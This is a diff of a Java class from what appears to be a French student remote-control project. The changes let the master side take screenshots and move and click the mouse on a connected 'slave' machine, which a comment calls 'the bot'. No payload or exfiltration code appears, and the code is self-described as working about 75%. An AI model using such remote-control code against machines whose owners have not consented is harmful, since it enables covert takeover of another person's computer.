@@ -5,6 +5,7 @@ import gui.MJInternalFrame;
 import gui.MTerminalJInternalFrame;
 
 import java.awt.FlowLayout;
+import java.awt.Graphics;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.awt.event.WindowAdapter;
@@ -21,11 +22,15 @@ import java.util.TimerTask;
 import java.util.concurrent.ArrayBlockingQueue;
 
 import javax.imageio.ImageIO;
+import javax.swing.Icon;
 import javax.swing.ImageIcon;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
+import javax.swing.SwingUtilities;
 
 import remote.action.ActionVNC;
+import remote.action.BougerSouris;
+import remote.action.ClickerSouris;
 import remote.action.ScreenShot;
 import send.specific.object.ReceivedSpecificObject;
 import send.specific.object.SendSpecificObject;
@@ -35,135 +40,126 @@ import constante.Constante;
 public class Connexion {
 
 	/**
-	 * Classe qui se charge de l'affichage de l'ecran de l'esclave Permet de
+	 * Classe qui se charge de l'affichage de l'écran de l'esclave Permet de
 	 * prendre le controle de la souris, et naviguer sur l'ordinateur de
-	 * l'esclave * Ne fonctionne pas
-	 * 
+	 * l'esclave 
+	 * Fonctionnement 75 %
 	 * @author Clement Collet & Louis Henri Franc & Mohammed Boukhari
 	 */
 
 	public static class Affichage extends JFrame {
-		private ArrayBlockingQueue<ActionVNC> _remoteActionsQueue;
 		private Timer timer;
-		private boolean isLaunched;
-		private JLabel jlabel;
-		private JFrame frame;
+		private boolean isLaunched;		// Est utilisé dans le code principal pour lancer le timer
+		private JLabel jlabel;			// Le jlabel contenant l'image
+		private JFrame frame;			// La fenètre
+		private ArrayBlockingQueue<ActionVNC> _remoteActionQueue; // Pour gérer les évenements
+		private ImageIcon ii;
 		public Affichage() {
-			/**
-			 * _remoteActionsQueue = new ArrayBlockingQueue<ActionVNC>(20); //
-			 * Creer // une // ArrayList // d'arguments
-			 * System.out.println("[debug] Affichage: Constructeur");
-			 * label.addMouseListener(new MouseAdapter() { // Ajoute un listener
-			 * // sur la souris
-			 * 
-			 * @Override public void mouseClicked(MouseEvent e) { // TODO
-			 *           Auto-generated method stub super.mouseClicked(e); } });
-			 *           // setSize(Constante.WINDOW_WIDTH,
-			 *           Constante.WINDOW_HEIGHT);
-			 * 
-			 *           Server.log.enregistrerFichier(
-			 *           "Ajout d'un listener de la souris");
-			 * 
-			 *           timer = new Timer(); // Redemmande un screenshot toutes
-			 *           les 2 // secondes pour mettre a jour // fenetre
-			 *           timer.scheduleAtFixedRate(new TimerTask() {
-			 * @Override public void run() { // TODO Auto-generated method stub
-			 *           try { _remoteActionsQueue.put(new ScreenShot());
-			 *           System.out
-			 *           .println("[debug] Affichage: Nouveau Screen ajouter a la queue"
-			 *           );
-			 * 
-			 *           } catch (InterruptedException e) { // TODO
-			 *           Auto-generated catch block e.printStackTrace(); } } },
-			 *           1, 5000);
-			 *           Server.log.enregistrerFichier("Ajout d'un timer");
-			 * 
-			 *           final Thread envoi = new Thread() { // Des qu'un nouvel
-			 *           objer // apparait dans la liste, se // charge de
-			 *           l'envoyer
-			 * @Override public void run() { while (arret) { try {
-			 * 
-			 *           if (!_remoteActionsQueue.isEmpty()) { ActionVNC ra =
-			 *           _remoteActionsQueue.poll(); _out.writeObject(ra);
-			 *           _out.flush(); } System.out .println(
-			 *           "[debug] Affichage: Envoit a l'esclave un RemoteAction"
-			 *           ); this.sleep(1000); Server.log .enregistrerFichier(
-			 *           "Envoi d'une nouvelle requete de RemoteActions"); }
-			 *           catch (IOException e) { // TODO Auto-generated catch
-			 *           block e.printStackTrace(); } catch
-			 *           (InterruptedException e) { // TODO Auto-generated catch
-			 *           block e.printStackTrace(); } } } }; envoi.start();
-			 * 
-			 *           addWindowListener(new WindowAdapter() { public void
-			 *           windowClosing(WindowEvent e) {
-			 *           System.out.println("Deconnexion"); timer.cancel();
-			 * 
-			 *           arret = false; _remoteActionsQueue.clear(); } });
-			 *           Server.log.enregistrerFichier(
-			 *           "Ajout d'un thread pour envoyer"); }
-			 * 
-			 *           public void setIcon() throws ClassNotFoundException,
-			 *           IOException { // Modifie // l'image // de BufferedImage
-			 *           img = null; // fond // TODO Auto-generated method stub
-			 *           try { System.out.println("trying to read Image"); img =
-			 *           ImageIO.read(_in);
-			 *           System.out.println("Image Reading successful....."); }
-			 *           catch (IOException e) { System.out.println(e); // TODO
-			 *           Auto-generated catch block e.printStackTrace(); } File
-			 *           save_path = new File(""); save_path.mkdirs(); try {
-			 *           ImageIO.write(img, "JPG", new File("img-" +
-			 *           System.currentTimeMillis() + ".jpg"));
-			 *           System.out.println("Image writing successful......"); }
-			 *           catch (IOException e) { // TODO Auto-generated catch
-			 *           block System.out.println(e); e.printStackTrace(); }
-			 **/
+
+			isLaunched = false;
+			
+			// jlabel crée qui contiendra l'image
+			jlabel = new JLabel();
+			jlabel.addMouseListener(new MouseAdapter() {
+				public void mouseClicked(MouseEvent e) {
+					_remoteActionQueue.add(new BougerSouris(e));
+					_remoteActionQueue.add(new ClickerSouris(e));
+					_remoteActionQueue.add(new ScreenShot());
+				}
+			});
+			
+			// instanciation de la pile d'objets 
+			_remoteActionQueue = new ArrayBlockingQueue<>(30);
+
+			// la fenetre
 			frame = new JFrame();
-			jlabel=new JLabel();
 			frame.setVisible(false);
 			frame.getContentPane().setLayout(new FlowLayout());
-			isLaunched=false;
+			frame.add(jlabel);
+			frame.addWindowListener(new WindowAdapter() {
+				public void windowClosing(WindowEvent e) {
+					stopTimer();
+					e.getWindow().dispose();
+				}
+			});
+			
+			// Gere la pile d'evenements pour eviter un stress 
+			Thread envoi = new Thread() {
+				public void run() {
+					ActionVNC ra =null;
+					while (true) {
+						if (!_remoteActionQueue.isEmpty()) {
+							ra = _remoteActionQueue.poll();
+							try {
+								_out.writeObject(ra);
+								_out.flush();
+							} catch (IOException e) {
+								e.fillInStackTrace();
+							}
+						}
+						try {
+							if(ra instanceof ScreenShot) sleep(1500);
+						} catch (InterruptedException e) {
+							e.fillInStackTrace();
+						}
+					}
+				}
+			};
+		envoi.start();
 		}
-		public void startTimer(){
-			isLaunched=true;
+		
+		// Lance un Timer qui demande à l'esclave ( le bot ) de lui envoyer une nouvelle image toutes les 5 secs
+		public void startTimer() {
+			isLaunched = true;
 			timer = new Timer();
 			timer.scheduleAtFixedRate(new TimerTask() {
-			
+
 				public void run() {
 					try {
-					//	System.out.println("Envoit d'une nouvelle demande");
-						_out.writeObject(new ScreenShot());
-					} catch (IOException e) {
-						// TODO Auto-generated catch block
-						e.printStackTrace();
+						_remoteActionQueue.put(new ScreenShot());
+					} catch (InterruptedException e) {
+						e.fillInStackTrace();
 					}
 				}
 			}, 1, 5000);
 			frame.setVisible(true);
 		}
-		public void stopTimer()
-		{
+
+		public void stopTimer() {
 			timer.cancel();
 		}
+
 		public boolean isLaunched() {
 			return isLaunched;
 		}
+
 		public void readImage() {
-			BufferedImage img = null; 
+			BufferedImage img1 = null;
 			try {
-				img = ImageIO.read(_so.getInputStream());
+				img1 = ImageIO.read(_so.getInputStream());
 			} catch (IOException e) {
-				System.out.println(e);
-				
-				e.printStackTrace();
+				e.fillInStackTrace();
 			}
-			frame.remove(jlabel);
-			frame.getContentPane().add(jlabel=new JLabel(new ImageIcon(img)));
-			frame.pack();
-	//		frame.setVisible(true);
-			frame.repaint();
+			final BufferedImage img=img1;
+			
+			SwingUtilities.invokeLater(new Runnable() {
+				@Override
+				public void run() {
+					System.out.println("Nouvelle image recu");
+					ii=new ImageIcon(img);
+					ii.getImage().flush();
+					frame.setSize(500, 500);
+					jlabel.setIcon(ii);
+					jlabel.repaint();
+					repaint();
+				}
+			});
+			
 		}
-		
-	}
+		public void paintComponent(Graphics g) {
+			  super.paintComponents(g);
+			  frame.setContentPane(jlabel);
+			}	}
 
 	private static ObjectInputStream _in; // Flux d'entrée
 	private static ObjectOutputStream _out; // Flux de sortie // Pour la VNC
@@ -322,7 +318,6 @@ public class Connexion {
 
 					}
 				} catch (IOException e) {
-					System.out.println(_ip + " s'est deconnecte"); // Handle
 					getThis()._compte.removeConnection(getThis());
 				} catch (ClassNotFoundException | InterruptedException e1) {
 					e1.printStackTrace();
@@ -379,8 +374,8 @@ public class Connexion {
 
 	public void sendVNCcommand() {
 
-			if(!_affichage.isLaunched)
-				_affichage.startTimer();
+		if (!_affichage.isLaunched)
+			_affichage.startTimer();
 
 	}
 
@@ -455,5 +450,4 @@ public class Connexion {
 		this._user_name = user_name;
 	}
 
-	
 }
